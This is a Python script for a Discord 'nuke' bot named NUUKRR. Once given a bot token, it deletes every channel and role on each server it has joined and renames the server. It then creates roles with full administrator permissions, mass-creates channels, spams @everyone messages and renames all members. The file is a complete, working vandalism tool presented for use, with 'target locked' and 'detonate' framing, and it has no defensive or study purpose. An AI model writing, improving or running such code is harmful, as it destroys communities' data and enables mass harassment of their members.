import discord
from discord.ext import commands
import asyncio
import random
import sys

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

BANNER = r"""
 ███▄    █  █    ██  █    ██  ██ ▄█▀ ██▀███   ██▀███  
 ██ ▀█   █  ██  ▓██▒ ██  ▓██▒ ██▄█▒ ▓██ ▒ ██▒▓██ ▒ ██▒
▓██  ▀█ ██▒▓██  ▒██░▓██  ▒██░▓███▄░ ▓██ ░▄█ ▒▓██ ░▄█ ▒
▓██▒  ▐▌██▒▓▓█  ░██░▓▓█  ░██░▓██ █▄ ▒██▀▀█▄  ▒██▀▀█▄  
▒██░   ▓██░▒▒█████▓ ▒▒█████▓ ▒██▒ █▄░██▓ ▒██▒░██▓ ▒██▒
░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░ ▒▓ ░▒▓░░ ▒▓ ░▒▓░
░ ░░   ░ ▒░░░▒░ ░ ░ ░░▒░ ░ ░ ░ ░▒ ▒░  ░▒ ░ ▒░  ░▒ ░ ▒░
   ░   ░ ░  ░░░ ░ ░  ░░░ ░ ░ ░ ░░ ░   ░░   ░   ░░   ░ 
         ░    ░        ░     ░  ░      ░        ░     
                                                      

"""

print(BANNER)
print("=" * 60)
print("           NUUKRR— DISCORD NUKE BOT")
print("=" * 60)

TOKEN = input("\n[1] Drop your bot token: ").strip()

try:
    CHANNEL_COUNT = int(input("[2] How many channels to spam? "))
    if CHANNEL_COUNT < 1 or CHANNEL_COUNT > 500:
        print("Keep it between 1-500, boss man.")
        sys.exit()
except ValueError:
    print("Numbers only! What the hell?")
    sys.exit()

SPAM_MESSAGE = input("[3] What message to spam? ")
try:
    SPAM_AMOUNT = int(input("[4] How many messages per channel? "))
    if SPAM_AMOUNT < 1:
        print("Gotta be at least 1, come on.")
        sys.exit()
except ValueError:
    print("Numbers only!")
    sys.exit()

try:
    NUKE_DURATION = int(input("[5] How long to nuke for (seconds)? "))
    if NUKE_DURATION < 1:
        print("Gotta nuke for at least a second.")
        sys.exit()
except ValueError:
    print("Numbers only!")
    sys.exit()

try:
    ROLE_COUNT = int(input("[6] How many roles to create? "))
    if ROLE_COUNT < 0 or ROLE_COUNT > 250:
        print("0-250 roles, Discord limit.")
        sys.exit()
except ValueError:
    print("Numbers only!")
    sys.exit()

ROLE_NAMES = []
if ROLE_COUNT > 0:
    print("[6b] Enter role names (press Enter for random):")
    for i in range(ROLE_COUNT):
        name = input(f"   Role {i+1} name: ").strip()
        ROLE_NAMES.append(name if name else f"nuukrr-{random.randint(1000,9999)}")

NEW_SERVER_NAME = input("[7] New server name: ").strip()
if not NEW_SERVER_NAME:
    NEW_SERVER_NAME = "Nuked by NUUKRR"

MEMBER_NICKNAME = input("[8] Nickname to give all members: ").strip()
if not MEMBER_NICKNAME:
    MEMBER_NICKNAME = "NUUKRR"

print("\n" + "=" * 60)
print("           ARMED AND READY. PRESS ENTER TO DETONATE.")
print("=" * 60)
input()

async def mass_channel_create(guild):
    channels = []
    tasks = []
    for i in range(CHANNEL_COUNT):
        name = f"nuukrr-{random.randint(1000, 999999)}"
        tasks.append(guild.create_text_channel(name))
    
    created = await asyncio.gather(*tasks, return_exceptions=True)
    return [c for c in created if isinstance(c, discord.TextChannel)]

async def mass_spam(channels):
    end_time = asyncio.get_event_loop().time() + NUKE_DURATION
    sent = 0
    
    while asyncio.get_event_loop().time() < end_time:
        tasks = []
        for channel in channels:
            if isinstance(channel, discord.TextChannel):
                tasks.append(channel.send(f"@everyone {SPAM_MESSAGE}"))
        
        if tasks:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            sent += len([r for r in results if not isinstance(r, Exception)])
        
        await asyncio.sleep(0.5)
    
    return sent

async def mass_roles(guild):
    tasks = []
    for name in ROLE_NAMES:
        color = discord.Color(random.randint(0, 0xFFFFFF))
        tasks.append(guild.create_role(name=name, color=color, permissions=discord.Permissions.all()))
    
    created = await asyncio.gather(*tasks, return_exceptions=True)
    return len([r for r in created if isinstance(r, discord.Role)])

async def rename_server(guild):
    try:
        await guild.edit(name=NEW_SERVER_NAME)
        return True
    except:
        return False

async def nickname_all(guild):
    tasks = []
    for member in guild.members:
        if member != guild.me and not member.bot:
            tasks.append(member.edit(nick=MEMBER_NICKNAME))
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return len([r for r in results if not isinstance(r, Exception)])

async def delete_existing(guild):
    ch_tasks = [c.delete() for c in guild.channels]
    await asyncio.gather(*ch_tasks, return_exceptions=True)
    
    bot_top_role = guild.me.top_role
    role_tasks = []
    for role in guild.roles:
        if role != guild.default_role and role < bot_top_role:
            role_tasks.append(role.delete())
    
    await asyncio.gather(*role_tasks, return_exceptions=True)

@bot.event
async def on_ready():
    print(f"\n🔥 NUUKRR online as {bot.user}")
    print("Target locked. Initiating sequence...\n")
    
    for guild in bot.guilds:
        print(f"💥 TARGET: {guild.name} ({guild.id})")
        print(f"   Members: {guild.member_count}")
        print(f"   Channels: {len(guild.channels)}")
        print(f"   Roles: {len(guild.roles)}")
        print("-" * 40)
        
        print("[PHASE 1] Purging existing channels and roles...")
        await delete_existing(guild)
        print("   ✓ Cleared")
        
        print("[PHASE 2] Renaming server...")
        if await rename_server(guild):
            print(f"   ✓ Server renamed to: {NEW_SERVER_NAME}")
        else:
            print("   ✗ Failed to rename")
        
        if ROLE_COUNT > 0:
            print(f"[PHASE 3] Creating {ROLE_COUNT} roles...")
            role_count = await mass_roles(guild)
            print(f"   ✓ Created {role_count} roles")
        
        print(f"[PHASE 4] Creating {CHANNEL_COUNT} channels...")
        channels = await mass_channel_create(guild)
        print(f"   ✓ Created {len(channels)} channels")
        
        print(f"[PHASE 5] Spamming for {NUKE_DURATION}s...")
        sent = await mass_spam(channels)
        print(f"   ✓ Sent {sent} messages")
        
        print("[PHASE 6] Renaming members...")
        renamed = await nickname_all(guild)
        print(f"   ✓ Nicknamed {renamed} members")
        
        print("\n" + "=" * 60)
        print("           NUKE COMPLETE. SERVER IS DUST.")
        print("=" * 60)
        print(f"""
        RESULTS:
        • Server: {NEW_SERVER_NAME}
        • Channels Created: {len(channels)}
        • Messages Sent: {sent}
        • Roles Created: {role_count if ROLE_COUNT > 0 else 0}
        • Members Renamed: {renamed}
        • Duration: {NUKE_DURATION}s
        """)
    
    print("\nLogging out...")
    await bot.close()

try:
    bot.run(TOKEN)
except discord.LoginFailure:
    print("\n❌ Invalid token, boss man. Check that shit.")
except Exception as e:
    print(f"\n❌ Error: {e}")
